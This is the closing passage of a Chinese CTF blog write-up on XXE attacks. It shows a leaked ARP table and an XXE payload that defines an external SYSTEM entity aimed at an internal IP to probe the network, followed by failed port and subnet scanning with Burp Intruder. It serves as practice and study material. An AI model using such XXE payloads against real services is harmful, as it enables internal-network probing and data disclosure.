+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-meta">HTTP/1.1</span> <span class="hljs-number">200</span> OK<br><span class="hljs-attribute">Server</span><span class="hljs-punctuation">: </span>openresty<br><span class="hljs-attribute">Date</span><span class="hljs-punctuation">: </span>Sat, 19 Mar 2022 01:44:27 GMT<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>text/html; charset=utf-8<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>275<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Vary</span><span class="hljs-punctuation">: </span>Accept-Encoding<br><span class="hljs-attribute">X-Powered-By</span><span class="hljs-punctuation">: </span>PHP/7.4.0RC6<br><br><span class="language-apache"><span class="hljs-section">&lt;result&gt;</span><span class="hljs-section">&lt;code&gt;</span><span class="hljs-attribute">0</span>&lt;/code&gt;&lt;msg&gt;IP address       HW type     Flags       HW address            Mask     Device</span><br><span class="language-apache"><span class="hljs-attribute">169</span>.<span class="hljs-number">254</span>.<span class="hljs-number">1</span>.<span class="hljs-number">1</span>      <span class="hljs-number">0</span>x1         <span class="hljs-number">0</span>x2         ee:ee:ee:ee:ee:ee     *        eth0</span><br><span class="language-apache"><span class="hljs-attribute">10</span>.<span class="hljs-number">128</span>.<span class="hljs-number">253</span>.<span class="hljs-number">12</span>    <span class="hljs-number">0</span>x1         <span class="hljs-number">0</span>x2         ee:ee:ee:ee:ee:ee     *        eth0</span><br><span class="language-apache"><span class="hljs-section">&lt;/msg&gt;</span><span class="hljs-section">&lt;/result&gt;</span></span><br></code></pre></td></tr></table></figure>
+
+<p>这玩意有啥用捏? 8知道，只知道是内网的，也就是只能通过里面的服务器读取。尝试读取ip: </p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">note</span> [</span><br><span class="hljs-meta">  <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">admin</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file://http://169.254.1.1&quot;</span>&gt;</span></span><br><span class="hljs-meta">  ]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span><span class="hljs-symbol">&amp;admin;</span><span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>123456<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>至于此处为啥是http而8是https呢？8要管了，以后会懂的<br>等待过程相当龟速…..</p>
+<p>然后结果是: 2个ip都报错，原因是connection time out in</p>
+<p>那就利用burp的intruder扫一下端口</p>
+<p>又是1个龟速的过程……看看有没有其他解法</p>
+<p>扫失败了，然后就扫一下地址，又叫内网扫描(eg:把http:169.254.1.1的最后一位数进行爆破)</p>
+<p>暴躁老哥上线，他妈的哪里出问题了? 老子一步一步按wp走的啊</p>
+<p>分析下原因，wp里，当访问ip时的回显和我的8一样，我的是请求时间过长(connection time out in)，而wp的则是请求被拒绝(connection refused in)，一个能ping通，1个8能ping通….也许这就是问题所在</p>
+<p>那为什么会请求时间过长呢? 我8知道，看了好多wp都是这个解法，没找到原因</p>
+<p>请求时间过长显然是内网的服务器的问题，而8是我这边的问题，那就这样吧，这破题就这么过了</p>
+<p>然后就很8爽啊啊啊啊啊啊</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/CTF/" class="category-chain-item">CTF</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/CTF/%E5%9F%BA%E7%A1%80/" class="category-chain-item">基础</a>
+  
+  
+
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/web/" class="print-no-link">#web</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>xxe攻击(2)</div>
+      <div>http://example.com/2022/02/11/xxe攻击(2)/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>John Doe</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>February 11, 2022</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>Licensed under</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2022/03/07/%E9%97%AD%E5%8C%85%E7%89%B9%E6%80%A7%E7%9A%84%E4%B8%80%E4%BA%9B%E7%94%A8%E9%80%94-%E6%8A%84/" title="python闭包特性&amp;&amp;python函数装饰器">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">python闭包特性&amp;&amp;python函数装饰器</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/02/10/xxe%E6%94%BB%E5%87%BB(1)/" title="xxe攻击(1)">
+                        <span class="hidden-mobile">xxe攻击(1)</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>Table of Contents</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
